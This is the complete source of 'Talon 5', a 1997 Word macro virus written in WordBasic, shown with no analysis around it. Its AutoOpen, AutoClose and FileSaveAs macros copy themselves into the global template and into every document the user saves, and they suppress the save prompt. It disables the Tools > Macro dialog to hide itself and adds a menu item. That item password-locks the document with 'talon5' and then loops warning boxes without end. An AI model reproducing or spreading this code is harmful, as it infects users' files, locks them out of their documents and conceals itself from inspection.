   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   WordBasic.MsgBox "This option is not available right now. Please install the HELP files to continue", "Warning", 48
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim F$
   Dim T$
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Z
    F$ = WordBasic.[FileName$]()
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    If dlg.Format = 0 Then dlg.Format = 1
     T$ = F$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", T$
     T$ = F$ + ":Info"
    WordBasic.MacroCopy "Global:Info", T$
     T$ = F$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", T$
     T$ = F$ + ":Menu"
    WordBasic.MacroCopy "Global:Menu", T$
     T$ = F$ + ":AutoClose"
    WordBasic.MacroCopy "Global:AutoClose", T$
     T$ = F$ + ":Scramble"
    WordBasic.MacroCopy "Global:Scramble", T$
     T$ = F$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", T$
           WordBasic.FileSaveAs dlg
   GoTo Q
   Z:
    If Err.Number <> 102 Then
     WordBasic.FileSaveAs dlg
    End If
   Q:
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim i
   Dim VInstalled
   Rem AutoClose macro
   On Error GoTo -1: On Error GoTo Finish
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   For i = 1 To WordBasic.CountMacros(1, 0)
           If WordBasic.[MacroName$](i, 1, 1) = "Info" Then
           VInstalled = 1
   End If
   Next i

   If VInstalled = 1 Then
           GoTo Finish
   Else
           On Error Resume Next
           WordBasic.FileSaveAs Format:=1
           WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
           WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
           WordBasic.MacroCopy "Global:Info", WordBasic.[FileName$]() + ":Info"
           WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", 1
           WordBasic.MacroCopy "Global:Scramble", WordBasic.[FileName$]() + ":Scramble", 1
           WordBasic.MacroCopy "Global:Menu", WordBasic.[FileName$]() + ":Menu", 1
           WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[FileName$]() + ":ToolsMacro", 1
          'FileSaveAll 1, 0
   End If

   Finish:
   End Sub

   Attribute VB_Name = "Scramble"

   Public Sub MAIN()
    WordBasic.FileSaveAs Password:="talon5", WritePassword:="talon5"
   Again:
   WordBasic.MsgBox "Thank You so Much For Pressing That Button, I Thought I Would Never Be Activated.", "Warning", 48
   WordBasic.MsgBox "Word Macro Virus Talon 5", "Warning", 48
   WordBasic.MsgBox "Talon Strikes Again", "Warning", 48
   GoTo Again
    End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim i
   Dim VInstalled
   On Error GoTo -1: On Error GoTo Finish
   For i = 1 To WordBasic.CountMacros(0, 0)
       If WordBasic.[MacroName$](i, 0, 0) = "Info" Then
       VInstalled = 1
   End If
   Next i

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":Menu", "Global:Menu", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":Scramble", "Global:Scramble", 1
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":Info", "Global:Info"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":ToolsMacro", "Global:ToolsMacro", 1
   End If
   SetAttr "C:\Msoffice\templates\normal.dot", 0
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   Finish:
   WordBasic.ToolsMacro Name:="Menu", Run:=1, Show:=0
   End Sub

   Attribute VB_Name = "Menu"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo Error1
   WordBasic.ToolsCustomizeMenus ResetAll:=1
   WordBasic.ToolsCustomizeMenuBar MenuText:="&Talon", Add:=1, Position:=-1
   WordBasic.ToolsCustomizeMenus Category:=2, Name:="scramble", _
           MenuType:=0, menu:="Talon", MenuText:="&Talon 5", _
           Add:=1
   Error1:
   End Sub


   Attribute VB_Name = "Info"
   Dim Talon
   Dim Places
   Dim a
   Dim the
   Dim menu
   Dim bar
   Dim When
   Dim selected
   Dim it
   Dim Saves
   Dim document
   Dim with_
   Dim pssword

   * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
                         Talon 5
   Places a "Talon" On the menu bar'.When selected it Saves the document with_ a pssword "Talon5"'.

                        Talon 1997

   * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
